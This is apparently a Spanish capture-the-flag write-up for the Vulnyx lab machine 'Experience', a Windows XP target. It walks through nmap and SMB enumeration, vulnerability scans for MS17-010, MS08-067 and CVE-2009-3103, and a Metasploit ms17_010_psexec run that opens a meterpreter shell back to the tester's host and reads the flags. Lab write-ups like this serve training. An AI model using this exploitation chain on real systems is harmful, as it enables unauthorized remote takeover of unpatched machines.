# Experience

Plataforma: Vulnyx
OS: Windows
Level: Easy
Status: Done
Complete: Yes
EJPT: yes
Created time: 26 de enero de 2025 15:58
IP: 192.168.0.150

## Recopilación de información

<aside>
💡 Reconocimiento general

</aside>

```bash
sudo arp-scan -I eth0 --localnet
Interface: eth0, type: EN10MB, MAC: 08:00:27:8e:e8:dc, IPv4: 192.168.0.115
Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)
192.168.0.1	02:10:18:37:9b:14	(Unknown: locally administered)
192.168.0.91	a0:88:69:69:7d:2d	Intel Corporate
192.168.0.110	24:2f:d0:54:73:f6	(Unknown)
192.168.0.150	08:00:27:aa:fb:6c	PCS Systemtechnik GmbH

whichSystem.py 192.168.0.150                                                                                               

	192.168.0.150 (ttl -> 128): Windows
```

### **Escaneo de puertos**

Comenzamos con un escaneo para identificar que puertos están abiertos.

---

```bash
sudo nmap -p- --open -T5 -sS --min-rate 5000 -n -Pn -vvv 192.168.0.150 -oG allports

PORT    STATE SERVICE      REASON
135/tcp open  msrpc        syn-ack ttl 128
139/tcp open  netbios-ssn  syn-ack ttl 128
445/tcp open  microsoft-ds syn-ack ttl 128
MAC Address: 08:00:27:AA:FB:6C (PCS Systemtechnik/Oracle VirtualBox virtual 

```

### **Enumeración de servicios**

Una vez listado los puertos accesibles, procederemos a realizar la enumeración de servicios para su posterior identificación de vulnerabilidades.

---

```bash
sudo nmap -p135,139,445 -sCV 192.168.0.150 -oX targeted.xml

PORT    STATE SERVICE      VERSION
135/tcp open  msrpc        Microsoft Windows RPC
139/tcp open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp open  microsoft-ds Windows XP microsoft-ds
MAC Address: 08:00:27:AA:FB:6C (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Service Info: OSs: Windows, Windows XP; CPE: cpe:/o:microsoft:windows, cpe:/o:microsoft:windows_xp

Host script results:
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
|_smb2-time: Protocol negotiation failed (SMB2)
| smb-os-discovery: 
|   OS: Windows XP (Windows 2000 LAN Manager)
|   OS CPE: cpe:/o:microsoft:windows_xp::-
|   Computer name: experience
|   NetBIOS computer name: EXPERIENCE\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2025-03-14T18:21:39-08:00
|_clock-skew: mean: 12h59m59s, deviation: 5h39m24s, median: 8h59m59s
|_nbstat: NetBIOS name: EXPERIENCE, NetBIOS user: <unknown>, NetBIOS MAC: 08:00:27:aa:fb:6c (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
```

- **Identificación de vulnerabilidades**

```bash
nmap --script=smb-enum-users,smb-os-discovery,smb-enum-shares,smb-enum-groups,smb-enum-domains 192.168.0.150 -p 135,139,445 -v -oN smb_enum.txt

Host script results:
| smb-enum-shares: 
|   note: ERROR: Enumerating shares failed, guessing at common ones (NT_STATUS_ACCESS_DENIED)
|   account_used: <blank>
|   \\192.168.0.150\ADMIN$: 
|     warning: Couldnt get details for share: NT_STATUS_ACCESS_DENIED
|     Anonymous access: <none>
|   \\192.168.0.150\C$: 
|     warning: Couldnt get details for share: NT_STATUS_ACCESS_DENIED
|     Anonymous access: <none>
|   \\192.168.0.150\IPC$: 
|     warning: Couldn't get details for share: NT_STATUS_ACCESS_DENIED
|_    Anonymous access: READ
| smb-os-discovery: 
|   OS: Windows XP (Windows 2000 LAN Manager)
|   OS CPE: cpe:/o:microsoft:windows_xp::-
|   Computer name: experience
|   NetBIOS computer name: EXPERIENCE\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2025-03-14T18:24:09-08:00

```

## Explotación

<aside>
💡 Probamos diferentes accesos

</aside>

### Explotación 1

```bash
msfconsole
msf6 > search eteral
------
   0   exploit/windows/smb/ms17_010_eternalblue       2017-03-14       average  Yes    MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption
   1     \_ target: Automatic Target                  .                .        .      .
   2     \_ target: Windows 7                         .                .        .      .
   3     \_ target: Windows Embedded Standard 7       .                .        .      .
   4     \_ target: Windows Server 2008 R2            .                .        .      .
   5     \_ target: Windows 8                         .                .        .      .
   6     \_ target: Windows 8.1                       .                .        .      .
   7     \_ target: Windows Server 2012               .                .        .      .
   8     \_ target: Windows 10 Pro                    .                .        .      .
   9     \_ target: Windows 10 Enterprise Evaluation  .                .        .      .
   10  exploit/windows/smb/ms17_010_psexec    
   
msf6 > use 10
msf6 > set LHOST 192.168.0.115
msf6 > run
meterpreter> shell
C:\Documents and Settings>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is 8842-9464

 Directory of C:\Documents and Settings

01/20/2024  10:38 AM    <DIR>          .
01/20/2024  10:38 AM    <DIR>          ..
01/20/2024  07:36 PM    <DIR>          All Users
01/20/2024  10:38 AM    <DIR>          bill
               0 File(s)              0 bytes
               4 Dir(s)   7,833,133,056 bytes free
               
Directory of C:\Documents and Settings\bill\Desktop

01/21/2024  11:41 AM    <DIR>          .
01/21/2024  11:41 AM    <DIR>          ..
01/21/2024  11:41 AM                35 root.txt
01/21/2024  11:41 AM                35 user.txt
               2 File(s)             70 bytes
               2 Dir(s)   7,833,133,056 bytes free
               
 C:\Documents and Settings\bill\Desktop>type root.txt user.txt
type root.txt user.txt
```

### Explotación 2

```bash
sudo nmap -p445 --script="smb-vuln-*" 192.168.0.150 -v
PORT    STATE SERVICE
445/tcp open  microsoft-ds
MAC Address: 08:00:27:AA:FB:6C (PCS Systemtechnik/Oracle VirtualBox virtual NIC)

Host script results:
| smb-vuln-ms08-067: 
|   VULNERABLE:
|   Microsoft Windows system vulnerable to remote code execution (MS08-067)
|     State: LIKELY VULNERABLE
|     IDs:  CVE:CVE-2008-4250
|           The Server service in Microsoft Windows 2000 SP4, XP SP2 and SP3, Server 2003 SP1 and SP2,
|           Vista Gold and SP1, Server 2008, and 7 Pre-Beta allows remote attackers to execute arbitrary
|           code via a crafted RPC request that triggers the overflow during path canonicalization.
|           
|     Disclosure date: 2008-10-23
|     References:
|       https://technet.microsoft.com/en-us/library/security/ms08-067.aspx
|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2008-4250
|_smb-vuln-ms10-061: ERROR: Script execution failed (use -d to debug)
| smb-vuln-ms17-010: 
|   VULNERABLE:
|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
|     State: VULNERABLE
|     IDs:  CVE:CVE-2017-0143
|     Risk factor: HIGH
|       A critical remote code execution vulnerability exists in Microsoft SMBv1
|        servers (ms17-010).
|           
|     Disclosure date: 2017-03-14
|     References:
|       https://technet.microsoft.com/en-us/library/security/ms17-010.aspx
|       https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/
|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143
| smb-vuln-cve2009-3103: 
|   VULNERABLE:
|   SMBv2 exploit (CVE-2009-3103, Microsoft Security Advisory 975497)
|     State: VULNERABLE
|     IDs:  CVE:CVE-2009-3103
|           Array index error in the SMBv2 protocol implementation in srv2.sys in Microsoft Windows Vista Gold, SP1, and SP2,
|           Windows Server 2008 Gold and SP2, and Windows 7 RC allows remote attackers to execute arbitrary code or cause a
|           denial of service (system crash) via an & (ampersand) character in a Process ID High header field in a NEGOTIATE
|           PROTOCOL REQUEST packet, which triggers an attempted dereference of an out-of-bounds memory location,
|           aka "SMBv2 Negotiation Vulnerability."
|           
|     Disclosure date: 2009-09-08
|     References:
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2009-3103
|_      http://www.cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2009-3103
|_smb-vuln-ms10-054: false
```

- Vulnerabilidades:
    - smb-vuln-ms08-067
    - smb-vuln-ms17-010
    - smb-vuln-cve2009-3103

Se puede igualmente atacar la maquina con alguna de las vulnerabilidades listadas, a traves de exploits manuales.

### Explotación posterior

<aside>
💡 Accedemos con las credenciales encontradas

</aside>

Con la ejecucion con metasploit, obtenemos un meterpreter como usuario nt/system, por lo que no es necesario elevar privilegios.

 privilegios

## Conclusión

<aside>
💡 Maquina resuelta con Metasploit para practicar de cara al Ejpt

</aside>